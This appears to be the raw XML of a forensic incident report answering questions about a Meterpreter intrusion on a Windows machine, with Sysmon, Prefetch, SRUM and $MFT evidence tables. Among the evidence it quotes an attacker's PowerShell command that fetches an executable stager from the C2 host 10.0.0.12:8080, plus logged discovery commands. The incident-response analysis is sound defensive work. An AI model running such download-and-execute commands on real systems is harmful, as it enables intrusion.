              <w:t>2023-11-10 11:13:35.786440</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>C:\Windows\system32\net1  user administrator</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-Sysmon/Operational 1 | Microsoft-Windows-Sysmon | Process creation | ProcessID: 1152, ProcessGUID: e6e9f951-105f-654e-cd01-000000000500 | RuleName: - | MD5=0F641F87A791AE07C00A725BBBD77724,SHA256=286E7F127B06386BD1CC9664851848F483A867F0F604AA352893151068715FAA,IMPHASH=41DBA1AF77E1A2260F0CE46D59ADCB5E | ParentProcess: C:\Windows\Sy</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#18696</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Sysmon%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:04:39.853697</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Prefetch</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Execution (Prefetch, previous)</w:t>
              <w:br/>
              <w:t>TRACERT.EXE</w:t>
              <w:br/>
              <w:t>runs=3 hash=EC2ABA23 False</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>pecmd/prefetch_0.csv#196</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\prefetch\TRACERT.EXE-EC2ABA23.pf</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:05:41.181847</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Prefetch</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Execution (Prefetch, last)</w:t>
              <w:br/>
              <w:t>QUSER.EXE</w:t>
              <w:br/>
              <w:t>runs=1 hash=FE15F6D2 False</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>pecmd/prefetch_0.csv#99</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\prefetch\QUSER.EXE-FE15F6D2.pf</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:11:23.838148</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Prefetch</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Execution (Prefetch, last)</w:t>
              <w:br/>
              <w:t>TASKLIST.EXE</w:t>
              <w:br/>
              <w:t>runs=1 hash=2448BC7D False</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>pecmd/prefetch_0.csv#193</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\prefetch\TASKLIST.EXE-2448BC7D.pf</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:12:23.447441</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Prefetch</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Execution (Prefetch, last)</w:t>
              <w:br/>
              <w:t>NETSTAT.EXE</w:t>
              <w:br/>
              <w:t>runs=1 hash=34A60389 False</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>pecmd/prefetch_0.csv#83</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\prefetch\NETSTAT.EXE-34A60389.pf</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:13:25.697436</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Prefetch</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Execution (Prefetch, last)</w:t>
              <w:br/>
              <w:t>WHOAMI.EXE</w:t>
              <w:br/>
              <w:t>runs=1 hash=824687C3 False</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>pecmd/prefetch_0.csv#217</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\prefetch\WHOAMI.EXE-824687C3.pf</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:13:35.775558</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Prefetch</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Execution (Prefetch, last)</w:t>
              <w:br/>
              <w:t>NET1.EXE</w:t>
              <w:br/>
              <w:t>runs=1 hash=1C88A7BA False</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>pecmd/prefetch_0.csv#82</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\prefetch\NET1.EXE-1C88A7BA.pf</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:06:40.822473</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>Windows PowerShell 600 | PowerShell | Provider is Started | HostApplication=explorer.exe</w:t>
              <w:br/>
              <w:t xml:space="preserve"> | HostName=MSFConsole</w:t>
              <w:br/>
              <w:t xml:space="preserve"> | HostVersion=0.1</w:t>
              <w:br/>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#28047</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Windows PowerShell.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Q4. Which IP and port is the malicious executable communicating with?</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artifact:browser (downloads, dissect)</w:t>
              <w:br/>
              <w:t>artifact:srum (network usage per application)</w:t>
              <w:br/>
              <w:t>evtx:microsoft-windows-powershell%4operational.evtx</w:t>
              <w:br/>
              <w:t>evtx:microsoft-windows-sysmon%4operational.evtx</w:t>
              <w:br/>
              <w:t>evtx:microsoft-windows-windows defender%4operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>10.0.0.12 on TCP port 8080.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>What the records show:</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- The payload was served from http://10.0.0.12:8080/pscp.exe. This appears in the Defender 1116 events, in the Edge WebCache history and download entries, and in the Zone.Identifier HostUrl on C:\Payloads\pscp.exe.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- The only Sysmon EID 3 connection from the attack chain is powershell.exe PID 736 ({e6e9f951-0f56-654e-af01-000000000500}, a child of Meterpreter cmd 5848). It connected from 10.0.0.124:50009 to 10.0.0.12:8080/tcp at 11:10:56 UTC to fetch /1.exe, as the 4104 script block records.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- The Sysmon configuration did not log network connections for pscp.exe or the injected explorer.exe 7324, so no event records the Meterpreter session socket itself. The output of `netstat -ntb` was not captured either.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- SRUM shows explorer.exe sending 69,181 bytes in the interval ending 11:43, against 3,284 bytes before. That fits C2 traffic carried by the migrated process.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Conclusion: the C2 server is 10.0.0.12, and 8080/tcp is the only port observed with it. I cannot rule out that the reverse session used a different port, such as the Metasploit default 4444, because nothing records that socket. The port is therefore probable, not confirmed.</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11:10:56.791298</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-Sysmon/Operational 3 | Microsoft-Windows-Sysmon | Network connection | ProcessID: 736, ProcessGUID: e6e9f951-0f56-654e-af01-000000000500 | RuleName: - | SourceHostname: DESKTOP-KJ81A5A.hsd1.md.comcast.net | SourceIp: 10.0.0.124 | DestinationHostname: - | DestinationIp: 10.0.0.12 | C:\Windows\System32\WindowsPowerShell\v1.0\powersh</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#18681</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Sysmon%4Operational.evtx</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10:16:44.708098</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webfile:_C:\Users\medmondson\Downloads\pscp.exe|http://10.0.0.12:8080/pscp.exe|pid:8820,ProcessStart:133440850044617643</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evtxecmd/evtxecmd_0.csv#23715</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Windows Defender%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:19:53.882523</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Browser (downloads, Dissect)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>download: ts_end</w:t>
              <w:br/>
              <w:t>C:\Users\medmondson\Downloads\pscp.exe</w:t>
              <w:br/>
              <w:t>url=http://10.0.0.12:8080/pscp.exe | browser=iexplore</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>dissect/browser.downloads.jsonl#6</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Users\medmondson\AppData\Local\Microsoft\Windows\WebCache\WebCacheV01.dat</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:43:00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received=86237 sent=69181 IF_TYPE_ETHERNET_CSMACD</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>srumecmd/20261019151050_SrumECmd_NetworkUsages_Output.csv#111</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\SRU\SRUDB.dat</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:15:00</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>SRUM (network usage per application)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>SRUM: network usage (end of period)</w:t>
              <w:br/>
              <w:t>\device\harddiskvolume4\windows\explorer.exe</w:t>
              <w:br/>
              <w:t>received=68056 sent=3284 IF_TYPE_ETHERNET_CSMACD</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>srumecmd/20261019151050_SrumECmd_NetworkUsages_Output.csv#61</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\SRU\SRUDB.dat</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Q5. Are there any other weird processes that can be associated with the malicious executable? If so, did they run?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artifact:powershell history (psreadline)</w:t>
              <w:br/>
              <w:t>evtx:microsoft-windows-powershell%4operational.evtx</w:t>
              <w:br/>
              <w:t>evtx:microsoft-windows-sysmon%4operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Yes. Two other executables are tied to the payload, but there is no evidence that either one ran.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>**C:\Payloads\test.exe**</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- Downloaded from 10.0.0.12:8080 at 10:21:41 UTC with PowerShell wget, before Sysmon was installed.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- Same size as pscp.exe: 986,624 bytes.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>**C:\Users\medmondson\1.exe**</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- Downloaded at 11:10:55 UTC by `wget http://10.0.0.12:8080/1.exe -o 1.exe`, run in powershell PID 736 inside the Meterpreter chain.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- The download shows in PowerShell 4104, Sysmon 3 and 11, $MFT, USN and SIDR. Size is 986,624 bytes.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>**Execution check for both files**</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- No Sysmon EID 1, Prefetch, Amcache, BAM, UserAssist or SRUM entry for either one.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- The equal size suggests they are copies of the same Meterpreter stager, but that is unverified because Sysmon did not hash them.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>**Processes that did run as part of the chain**</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- The injected sacrificial explorer.exe 7324.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- cmd.exe 6600 and 5848.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- powershell.exe 736.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- The discovery LOLBins listed in Q3.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- The Meterpreter PowerShell host 'MSFConsole' inside explorer.exe.</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10:21:41.003421</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>$MFT</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>$SI creation (B) ; $FN modification (M) ; $FN access (A) ; $FN MFT change (C)</w:t>
              <w:br/>
              <w:t>C:\Payloads\test.exe</w:t>
              <w:br/>
              <w:t>size=986624</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>mftecmd_mft/mft.csv#109630</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\$MFT</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:10:55.603703</w:t>
